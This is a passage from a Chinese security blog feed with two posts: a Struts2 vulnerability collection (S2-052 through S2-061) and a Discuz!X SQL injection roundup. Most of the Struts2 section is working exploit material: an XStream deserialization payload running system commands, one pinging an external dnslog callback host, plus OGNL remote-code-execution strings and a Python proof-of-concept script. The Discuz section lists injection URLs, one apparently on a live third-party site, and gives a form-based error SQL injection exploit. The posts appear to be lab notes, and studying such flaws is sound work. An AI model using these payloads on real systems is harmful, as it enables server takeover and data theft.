<h4 id="漏洞探测-13"><a href="#漏洞探测-13" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>启动环境后，访问<code>http://your-ip:8080/orders.xhtml</code>即可看到showcase页面。由于rest-plugin会根据URI扩展名或Content-Type来判断解析方法，所以我们只需要修改orders.xhtml为orders.xml或修改Content-Type头为application&#x2F;xml，即可在Body中传递XML数据。</p>
<p>所以，最后发送的数据包为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /orders/3/edit HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 2415</span><br><span class="line"></span><br><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &lt;string&gt;touch&lt;/string&gt;</span><br><span class="line">                        &lt;string&gt;/tmp/success&lt;/string&gt;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>



<p>以上数据包成功执行的话，会在docker容器内创建文件<code>/tmp/success</code>，执行<code>docker-compose exec struts2 ls /tmp/</code>即可看到。</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310103905014.png" class title="image-20220310103905014">

<h4 id="漏洞利用-13"><a href="#漏洞利用-13" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &lt;string&gt; ping&lt;/string&gt;</span><br><span class="line">                        &lt;string&gt;test.oyyzjl.dnslog.cn&lt;/string&gt;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>



<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310110008343.png" class title="image-20220310110008343">

<h3 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h3><h4 id="漏洞简介-14"><a href="#漏洞简介-14" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
<h4 id="漏洞版本-13"><a href="#漏洞版本-13" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.1 - 2.3.33</p>
<p>2.5 -  2.5.10</p>
<h4 id="漏洞探测-14"><a href="#漏洞探测-14" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用-14"><a href="#漏洞利用-14" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h3 id="S2-057（CVE-2018-11776）"><a href="#S2-057（CVE-2018-11776）" class="headerlink" title="S2-057（CVE-2018-11776）"></a>S2-057（CVE-2018-11776）</h3><h4 id="漏洞简介-15"><a href="#漏洞简介-15" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>当Struts2的配置满足以下条件时：</p>
<ul>
<li>alwaysSelectFullNamespace值为true</li>
<li>action元素未设置namespace属性，或使用了通配符</li>
</ul>
<p>namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。</p>
<h4 id="漏洞版本-14"><a href="#漏洞版本-14" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>小于等于 Struts 2.3.34 与 Struts 2.5.16</p>
<h4 id="漏洞探测-15"><a href="#漏洞探测-15" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>测试OGNL表达式<code>$&#123;233*233&#125;</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action</span><br></pre></td></tr></table></figure>

<p>返回表达式执行结果</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310111833429.png" class title="image-20220310111833429">

<h4 id="漏洞利用-15"><a href="#漏洞利用-15" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>获取id信息</strong></p>
<p>需要将其进行URL编码转换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>

<p>获取id信息值</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310113350760.png" class title="image-20220310113350760">



<p><strong>获取当前用户</strong></p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310113456090.png" class title="image-20220310113456090">

<h3 id="S2-059-CVE-2019-0230"><a href="#S2-059-CVE-2019-0230" class="headerlink" title="S2-059  (CVE-2019-0230)"></a>S2-059  (CVE-2019-0230)</h3><h4 id="漏洞简介-16"><a href="#漏洞简介-16" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。</p>
<h4 id="漏洞版本-15"><a href="#漏洞版本-15" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 -  2.5.20</p>
<h4 id="漏洞探测-16"><a href="#漏洞探测-16" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>访问 <code>http://your-ip:8080/?id=%25%7B233*233%7D</code>，可以发现233*233的结果被解析到了id属性中：</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310141627782.png" class title="image-20220310141627782">



<h4 id="漏洞利用-16"><a href="#漏洞利用-16" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>poc</strong></p>
<p>在tmp目录下创建success文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ip:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;touch /tmp/success&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="comment"># print(res1.text)</span></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br></pre></td></tr></table></figure>

<p>创建文件成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310141245421.png" class title="image-20220310141245421">

<h3 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h3><h4 id="漏洞简介-17"><a href="#漏洞简介-17" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式为加强OGNL表达式沙盒，而S2-061绕过了该沙盒</p>
<h4 id="漏洞版本-16"><a href="#漏洞版本-16" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 -  2.5.25</p>
<h4 id="漏洞探测-17"><a href="#漏洞探测-17" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>GNL表达式执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310145518461.png" class title="image-20220310145518461">



<h4 id="漏洞利用-17"><a href="#漏洞利用-17" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=%25&#123;(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d&#123;%27id%27&#125;).(%23res%3d%23exec.exec(%23cmd))&#125;</span><br></pre></td></tr></table></figure>



<p>返回服务器id值</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310150417451.png" class title="image-20220310150417451">

]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web漏洞</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>-web漏洞 -OGNL表达式 -Struts2漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>wLHK-Discuz漏洞整理</title>
    <url>/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h1 id="Discuz-X漏洞"><a href="#Discuz-X漏洞" class="headerlink" title="Discuz!X漏洞"></a>Discuz!X漏洞</h1><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>漏洞描述：</strong>Discuz历史版本中存在着大量的sql注入漏洞，存在于大量插件和管理后台中，且有些SQL注入漏洞涉及版本不清晰。涉及URL如下：</p>
<p>##问卷调查专业版插件-nds_ques_viewanswer.inc.php—&gt;演示1</p>
<p><a href="http://ip/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dataline">http://ip/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dataline</a></p>
<p>##&#x2F;source&#x2F;include&#x2F;misc&#x2F;misc_stat.php—&gt;演示2</p>
<p><a href="http://ip/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types%5B1%5D=x">http://ip/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]&#x3D;x</a></p>
<p>##discuz ychat插件-table_ychat_rooms.php、rooms.php—&gt;演示3</p>
<p><a href="http://ip/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x">http://ip/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x</a></p>
<p>##江湖客栈插件-forummission.php—&gt;演示4</p>
<p><a href="http://ip/forummission.php?index=show&amp;id=24">http://ip/forummission.php?index=show&amp;id=24</a></p>
<p>## my.php—&gt;演示5</p>
<p><a href="http://ip/my.php?item=buddylist">http://ip/my.php?item=buddylist</a></p>
<p>## UChome插件—&gt;演示6</p>
<p><a href="http://ip/uchome/cp.php?ac=blog&amp;blogid=1">http://ip/uchome/cp.php?ac=blog&amp;blogid=1</a></p>
<p>##交友插件- jiaoyou.php—&gt;演示7</p>
<p><a href="http://ip/jiaoyou.php?pid=1">http://ip/jiaoyou.php?pid=1</a></p>
<p><a href="http://ip/jiaoyou.php?mod=search&amp;residecity">http://ip/jiaoyou.php?mod=search&amp;residecity</a>&#x3D;</p>
<p>##v63积分商城插件- \source\class\discuz\discuz_database.php—&gt;演示8</p>
<p><a href="http://ip/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110">http://ip/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110</a></p>
<p>## misc插件- source\module\forum\forum_misc.php—&gt;演示9</p>
<p><a href="http://ip/forum.php?mod=misc&tid=%7Btid%7D&action=postappend&pid=%7Bpid%7D">http://ip/forum.php?mod=misc&tid={tid}&action=postappend&pid={pid}</a></p>
<p>## attachment插件- \source\module\forum\forum_attachment.php—&gt;演示10</p>
<p><a href="http://ip/forum.php?mod=attachment&amp;findpost=ss&amp;aid">http://ip/forum.php?mod=attachment&amp;findpost=ss&amp;aid</a>&#x3D;</p>
<p>##心情墙插件- moodwall.inc.php—&gt;演示11</p>
<p><a href="http://ip/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2">Http://ip/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2</a></p>
<p>##空间功能-space.php—&gt;演示12</p>
<p><a href="http://ip/space.php?username">http://ip/space.php?username</a>&#x3D;</p>
<p>## trade.php—&gt;演示13</p>
<p><a href="http://ip/trade.php">http://ip/trade.php</a></p>
<p>##会员中心—&gt;演示14</p>
<p><a href="http://ip/member/pm.php?dopost=read&amp;id=1">http://ip/member/pm.php?dopost=read&amp;id=1</a></p>
<p>##管理后台-工具-数据电泳-自定义-模块名称等—&gt;演示15</p>
<p>测试步骤与截图：</p>
<p>各漏洞演示如下，共有19个功能或插件存在sql注入，但最后4个sql注入漏洞只找到POC，暂时无法演示。</p>
<h3 id="演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞"><a href="#演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞" class="headerlink" title="演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞"></a>演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞</h3><p>找到问卷调查专业版插件所在链接：<a href="http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dateline">http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dateline</a>(问题出在orderby参数)，对该参数进行sql注入</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ec93ccdee00378ab38b1316ace94c44b.png" class>

<p>接下来就是使用sqlmap进行暴库了。</p>
<p>参考链接：<a href="http://www.5kik.com/php0day/239.html">http://www.5kik.com/php0day/239.html</a></p>
<h3 id="演示2：Discuz-x3-2前台GET型SQL注入漏洞（绕过全局WAF）"><a href="#演示2：Discuz-x3-2前台GET型SQL注入漏洞（绕过全局WAF）" class="headerlink" title="演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）"></a>演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）</h3><p>找到注入点：<a href="http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types%5B1%5D=x">http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]&#x3D;x</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946b2c1d8e99431b39ca31aa6d56b11d.png" class>

<p>也就是说我们可以控制的部分有很多。<br>且不看全局防注入源码，黑盒试一下我发现一旦出现’、(就会拦截，而且注释符（#、–）也会拦截。<br>括号不能有，就特别拙计，因为很多盲注需要括号，子查询也需要括号，函数也需要括号，这里都不能用了。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/85936efd8e72984ff6c94729f00cf1a3.png" class>

<p>我们再看上述sql语句，发现我们可控的部分前面，还有个daytime。这就愁坏我了，因为我要查询的表是用户表，而用户表根本没这个字段。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a01c46097785d64627eac5950a435d50.png" class>

<p>执行会提示Unknown column ‘daytime’ in ‘field list’。<br>所以，我们可以利用mysql的特性，一次查询两个表，将pre_ucenter_members的数据连带着查询出来：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b1530110687ade97e4c2ee5244cf1782.png" class>

<p>大家可以看到，已经不报错了。因为pre_common_statuser表中存在`daytime`这个列。而且这个表中也有uid这个列，正好可以作为pre_ucenter_members的筛选项。<br>那么，有的同学再问，sql语句后半部分<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/cbe2ae3ffe3c952fc9bec375b642557b.png" class></p>
<p>没有注释符怎么处理？<br>这里有个巧合，在某些情况下，`能作为注释符用。因为mysql会自动给sql语句结尾没有闭合的`闭合掉，这样，只要让mysql人为后面那一大串字符是一个字段的“别名”即可。<br>所以，先构造一个url：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3203a48961dfad2e03dbd9c55ee76626.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/50cf97eebf609ecdeda0134d1a96fe3a.png" class>

<p>可以看到已经出数据了。但发现出来的数据只有4位。<br>原因是，在源码中使用了substr取了daytime的第4到8位。修改POC</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/618e4f8322f62c03c515a8d32169f169.png" class>

<p>参考链接：<a href="https://www.secpulse.com/archives/26869.html">https://www.secpulse.com/archives/26869.html</a></p>
<h3 id="演示3：discuz-ychat插件注入漏洞"><a href="#演示3：discuz-ychat插件注入漏洞" class="headerlink" title="演示3：discuz ychat插件注入漏洞"></a>演示3：discuz ychat插件注入漏洞</h3><p><a href="http://www.51jqa.com/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x">http://www.51jqa.com/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x</a></p>
<p>cid参数存在SQL注入</p>
<p>参考链接：<a href="https://bugs.shuimugan.com/bug/view?bug_no=108978">https://bugs.shuimugan.com/bug/view?bug_no=108978</a></p>
<h3 id="演示4：Discuz-Plugin-JiangHu-1-1-x2F-forummission-php-SQL注入漏洞"><a href="#演示4：Discuz-Plugin-JiangHu-1-1-x2F-forummission-php-SQL注入漏洞" class="headerlink" title="演示4：Discuz Plugin JiangHu 1.1 &#x2F;forummission.php SQL注入漏洞"></a>演示4：Discuz Plugin JiangHu 1.1 &#x2F;forummission.php SQL注入漏洞</h3><p>forummission.php？index&#x3D;show$id&#x3D;24中的id参数存在sql注入漏洞</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8737db6a75addd1839b67cde1f094956.png" class>

<p>参考链接：<a href="http://www.gltc.cn/30161.html">http://www.gltc.cn/30161.html</a></p>
<h3 id="演示5：Discuz-6-0-x2F-my-php-SQL注入漏洞"><a href="#演示5：Discuz-6-0-x2F-my-php-SQL注入漏洞" class="headerlink" title="演示5：Discuz 6.0 &#x2F;my.php SQL注入漏洞"></a>演示5：Discuz 6.0 &#x2F;my.php SQL注入漏洞</h3><p>把以下EXP保存成HTML文档</p>
<p>&lt;form method&#x3D;’post’ action&#x3D;’<a href="http://dz6.0/my.php?item=buddylist&#39;\&gt;">http://dz6.0/my.php?item=buddylist&#39;\&gt;</a> &lt;input<br>type&#x3D;’hidden’ value&#x3D;”1111” name&#x3D;”descriptionnew[1’ and(select 1 from(select<br>count(*),concat((select (select (select<br>concat(0x7e,user(),0x7e,0x5430304C5320474F21,0x7e) limit 0,1)) from<br>information_schema.tables limit 0,1),floor(rand(0)*2))x from<br>information_schema.tables group by x)a) and 1&#x3D;1#]” &#x2F;&gt;&lt;br &#x2F;&gt; &lt;input<br>type&#x3D;’submit’ value&#x3D;’buddysubmit’ name&#x3D;’buddysubmit’ &#x2F;&gt;&lt;br &#x2F;&gt; &lt;&#x2F;form&gt;</p>
<p>使用浏览器打开</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ea45b4207fca0e5fb1d8a950810dca79.png" class>

<p>参考链接：<a href="https://bugs.shuimugan.com/bug/view?bug_no=80359">https://bugs.shuimugan.com/bug/view?bug_no=80359</a></p>
